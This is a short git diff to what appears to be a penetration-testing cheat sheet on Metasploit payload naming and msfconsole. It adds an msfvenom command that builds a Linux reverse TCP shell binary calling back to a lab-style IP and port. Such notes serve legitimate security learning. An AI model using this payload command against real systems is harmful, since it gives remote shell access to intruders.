@@ -70,6 +70,11 @@ so shell_reverse_tcp at index 20 is not staged, whereas shell/reverse_tcp at ind
 
 ![Pasted image 20230508141045](https://github.com/dbissell6/Shadow_Stone/assets/50979196/988055f3-d9a3-4b0a-9e5b-be91b0886c30)
 
+```
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.34 LPORT=9999 -f elf -o shell.elf
+```
+
+
 ### msfconsole
 
 g will set variable as global, useful when trying different exploits
